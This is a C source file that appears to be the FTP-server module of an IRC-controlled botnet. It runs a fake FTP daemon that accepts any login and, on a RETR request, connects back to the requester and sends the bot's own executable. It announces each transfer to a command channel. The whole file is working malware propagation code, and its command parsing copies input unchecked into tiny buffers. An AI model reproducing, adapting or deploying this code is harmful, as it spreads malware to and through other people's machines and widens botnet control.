// enjoi


#include "includes.h"
#include "functions.h"
#include "externs.h"
#ifndef NO_FTPD

//#pragma warning(disable : 4018)
//#pragma comment(lib, "ws2_32")
SOCKET data_sock;

int ftp_Data_connect(char *ip,int port);
int Ftp_data_transfer();
extern SOCKET sock;

DWORD WINAPI ftpserver(LPVOID pParam) {

	WSADATA wsdata;
	SOCKET listener;
	SOCKET newfd;

	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;

	char buf[100];
//	char t_buf[1024];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;

	fd_set master;   // master file descriptor list
	fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);    // clear the master and temp sets
	FD_ZERO(&read_fds);

	fWSAStartup(MAKEWORD(1,1), &wsdata);

	srand(time(NULL));

	listener = fsocket(AF_INET, SOCK_STREAM, 0);
	fsetsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	fioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = fhtons(ftpport);

	if (fbind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	flisten(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;


	while(1) {
		read_fds = master;
		if (fselect(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			memset(buf,0,sizeof(buf));
			memset(tmpbuf,0,sizeof(tmpbuf));
			if (fFD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = faccept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						fsend(newfd, "220 StnyFtpd 0wns j0\n",21 , 0);
					}
				} else {
					if ((nbytes = frecv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR((unsigned int)i, &master);
						fclosesocket(i);
					} else {
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							fsend(i,"331 Password required\n",22 , 0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							fsend(i,"230 User logged in.\n",20 , 0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							fsend(i,"215 StnyFtpd\n",13 , 0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							fsend(i,"350 Restarting.\n",16 , 0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							fsend(i,"257 \"/\" is current directory.\n",30 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							fsend(i,"200 Type set to A.\n",19 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							fsend(i,"200 Type set to I.\n",19 , 0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							char pasv[] = "425 Passive not supported on this server\n";
							fsend(i, pasv, strlen(pasv), 0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							char list[] = "226 Transfer complete\n";
							fsend(i, list, strlen(list), 0);
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							memset(p1,0,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							fsend(i,"200 PORT command successful.\n",29 , 0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							fsend(i,"150 Opening BINARY mode data connection\n",40 , 0);
							if(ftp_Data_connect(tmpip,(int)h) == 1) {

								sprintf(sendbuf,"[FTP]: File transfer started to IP: %s (%s).",tmpip,ftp.filename);
								if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);

								if (Ftp_data_transfer() == 1) {
									fsend(i,"226 Transfer complete.\n",23 , 0);
									sprintf(sendbuf,"[FTP]: File transfer complete to IP: %s (%s).",tmpip,ftp.filename);
									if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
									addlog(sendbuf);
									//sprintf(f_tmp, "privmsg %s :StnyFtpd(%s): Transfer finished.\n", joinchan, tmpip);
									//sendf();
								}
							} else {
								fsend(i,"425 Can't open data connection.\n",32,0);
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							fsend(i,"221 Goodbye happy r00ting.\n",27 , 0);
						}
						memset(buf,0,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int ftp_Data_connect(char *ip,int port)
{
	struct sockaddr_in server;
	WSADATA wsdata;

	fWSAStartup(MAKEWORD(1,1), &wsdata);

	data_sock = fsocket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = finet_addr(ip);
    server.sin_port = fhtons(port);

	if (fconnect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
		fclosesocket(data_sock);
		fWSACleanup();
		return 0;
	}
	return 1;
}

int Ftp_data_transfer() {
	FILE * fid;
	char myfname[MAX_PATH];
	unsigned char buffer[1024];
	GetModuleFileName(NULL,myfname,sizeof(myfname));

	fid = fopen(myfname, "rb");
	if (!fid) { return 0; }

	while(!feof(fid))
	{
		fread(&buffer, sizeof(buffer), 1, fid);
		fsend(data_sock, (const char*)buffer, sizeof(buffer), 0);
		Sleep(1);
	}
	fclose(fid);
	fclosesocket(data_sock);
	fWSACleanup();
	return 1;
}

#endif